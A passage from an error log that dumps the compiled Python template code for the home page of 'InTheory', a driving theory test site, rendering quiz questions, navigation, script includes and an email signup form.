360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
